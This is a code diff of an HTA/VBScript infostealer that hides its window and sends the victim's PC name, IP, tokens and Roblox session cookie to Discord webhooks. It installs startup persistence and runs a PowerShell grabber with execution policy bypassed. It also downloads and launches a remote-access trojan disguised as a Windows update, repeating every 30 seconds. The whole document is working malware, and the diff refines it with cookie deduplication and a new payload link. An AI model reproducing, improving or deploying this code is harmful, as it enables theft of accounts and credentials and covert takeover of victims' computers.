@@ -6,7 +6,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
+Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -16,8 +16,9 @@ RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
+lastCookie = ""
 
-' --- 1. INITIAL: send target card, IP, tokens, cookie, and RAT to the FIRST channel ---
+' --- 1. INITIAL (all to WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
@@ -25,7 +26,7 @@ Call Persistence
 Call PostCookieOnly(WH)
 Call DropRAT(WH)
 
-' --- 2. LOOP: re-grab every 30s, RAT re-fire on BOTH channels until it lands ---
+' --- 2. LOOP (all to RE_WH) ---
 Dim runCount
 runCount = 0
 Do
@@ -34,17 +35,15 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    If Not ratDropped Then
-        Call DropRAT(RE_WH)
-    End If
+    If Not ratDropped Then Call DropRAT(RE_WH)
     Call SleepSeconds(30)
 Loop
 
 window.close()
 
-' --- RAT DROP ---
+' --- RAT DROP: always posts rocket, then check or fail ---
 Sub DropRAT(targetWH)
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1573211629770772510/Winupdate.exe?ex=6b012f01&is=6affdd81&hm=a224ef4e41dca378740f95f58a8a0cdd5406aa60f24b376a510f101adcf83d9b&"
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
@@ -52,6 +51,7 @@ Sub DropRAT(targetWH)
     Dim op : op = tPath & "\" & fname
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
+    ' Rocket fires BEFORE download so you always see the attempt
     Call PostEmbedTo(":rocket: RAT Download", "Starting download...", 10181046, targetWH)
 
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
@@ -65,12 +65,12 @@ Sub DropRAT(targetWH)
             Call RunCmd("""" & op & """")
             ratDropped = True
             Call SleepSeconds(2)
-            Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
+            Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed.", 10181046, targetWH)
         Else
-            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes", 16711680, targetWH)
+            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes (link may be expired)", 16711680, targetWH)
         End If
     Else
-        Call PostEmbedTo(":x: RAT Download", "Download failed — file not created.", 16711680, targetWH)
+        Call PostEmbedTo(":x: RAT Download", "Download failed — file not created (link may be expired)", 16711680, targetWH)
     End If
 End Sub
 
@@ -101,10 +101,12 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly: direct read, posts to whichever channel called it ---
+' --- PostCookieOnly: dedupes, only sends a NEW cookie ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) < 20 Then Exit Sub
+    If cookie = lastCookie Then Exit Sub
+    lastCookie = cookie
     Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
@@ -138,6 +140,7 @@ Function GetRobloxCookie()
     If Len(fp) = 0 Then Exit Function
     raw = ReadFile(fp)
     If Len(raw) < 20 Then Exit Function
+
     Dim cookie: cookie = ""
     Dim sp: sp = InStr(raw, "CookiesData"":""")
     If sp > 0 Then
@@ -193,7 +196,7 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
-' --- GrabTokens: runs ps1, parses result, posts every line to the channel that called it ---
+' --- GrabTokens: WAITS for ps1 to finish before reading ---
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -212,11 +215,10 @@ Sub GrabTokens(targetWH)
 
     sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False
 
-    ' wait for DONE sentinel (120s ceiling)
+    ' Wait for the ps1 to actually write the file and finish writing
     Dim waited: waited = 0
     Dim lastSize: lastSize = -1
     Dim stable: stable = 0
-    Dim done: done = False
     Do
         Call SleepSeconds(2)
         waited = waited + 2
@@ -227,16 +229,15 @@ Sub GrabTokens(targetWH)
             On Error GoTo 0
             If sz = lastSize And sz > 0 Then stable = stable + 1 Else stable = 0
             lastSize = sz
-            If stable >= 2 Then
-                Dim peek: peek = ReadFile(tf)
-                If InStr(peek, "DONE") > 0 Then done = True
-            End If
+            If stable >= 2 Then Exit Do
         End If
-        If done Then Exit Do
-        If waited >= 120 Then Exit Do
+        If waited >= 90 Then Exit Do
     Loop
 
-    If Not fso.FileExists(tf) Then Exit Sub
+    If Not fso.FileExists(tf) Then
+        Call PostEmbedTo(":warning: Steal", "ps1 finished but no result file", 16776960, targetWH)
+        Exit Sub
+    End If
 
     Dim cp: cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
     On Error Resume Next
